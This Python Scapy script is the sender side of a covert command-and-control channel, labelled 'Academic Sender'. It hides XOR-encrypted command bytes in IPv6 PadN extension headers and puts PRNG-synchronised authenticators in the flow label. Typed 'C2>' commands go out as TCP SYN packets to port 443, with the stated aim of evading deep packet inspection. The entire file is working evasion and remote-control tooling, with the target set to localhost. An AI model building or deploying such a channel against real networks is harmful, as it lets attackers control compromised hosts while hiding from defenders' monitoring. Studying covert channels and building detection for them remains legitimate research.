from scapy.all import *
import time
import sys
import random

# --- CONFIGURATION ---
TARGET_IP = "::1"          
ENCRYPTION_KEY = 0x55      
TRIGGER_CHAR = ";"         
SEED_VAL = 1114
SYNC_ID = 0xFFFFF          

random.seed(SEED_VAL)

def craft_stealth_packet(char_byte, flow_label_magic):
    """
    Distributes the steganography: 
    - PRNG Magic ID goes into the 20-bit Flow Label.
    - Encrypted character goes into the PadN Extension Header.
    """
    encrypted_byte = bytes([char_byte ^ ENCRYPTION_KEY])
    covert_padn = PadN(optdata=encrypted_byte)
    dest_opt_header = IPv6ExtHdrDestOpt(options=[covert_padn])
    
    pkt = (IPv6(dst=TARGET_IP, fl=flow_label_magic) / 
           dest_opt_header / 
           TCP(dport=443, flags="S")) 
           
    return pkt

def send_covert_traffic(cmd):
    full_message = cmd + TRIGGER_CHAR

    print(f"[*] Target: {TARGET_IP}")
    print("[*] Initiating Burst-Sync sequence...")
    
    # 1. Transmit 3 Burst-Sync packets to guarantee Receiver PRNG reset
    for _ in range(3):
        # We send a packet with a specific SYNC Flow Label and a dummy PadN
        sync_pkt = craft_stealth_packet(0x00, SYNC_ID)
        send(sync_pkt, verbose=False)
        time.sleep(0.02)
        
    time.sleep(0.05) # Allow receiver buffer to process sync
    random.seed(SEED_VAL)
    
    print(f"[*] Transmitting Payload: '{cmd}' via Distributed Channels...")
    
    # 2. Transmit the actual payload byte-by-byte
    for char in full_message:
        byte_val = ord(char)
        
        # Generate the cryptographic authenticator for the Flow Label
        expected_magic = random.randint(0, 0xFFFFE)
        
        malicious_pkt = craft_stealth_packet(byte_val, expected_magic)
        send(malicious_pkt, verbose=False)
        
        # 0.02s delay mimics natural network jitter and prevents buffer overflow
        time.sleep(0.02) 
        
    print("[+] Transmission complete. Stealth Evasion successful.\n")

if __name__ == "__main__":
    print("==================================================")
    print("  Academic Sender: Distributed Steganography    ")
    print(" Evading DPI via Flow Label & PadN Manipulation   ")
    print("==================================================")
    print("Type your command. Type 'exit' to quit.\n")
    
    while True:
        try:
            user_input = input("C2> ")
            if not user_input: continue
            if user_input.lower() in ['exit', 'quit']: break
            
            send_covert_traffic(user_input)
            
        except KeyboardInterrupt:
            print("\nExiting...")
            break
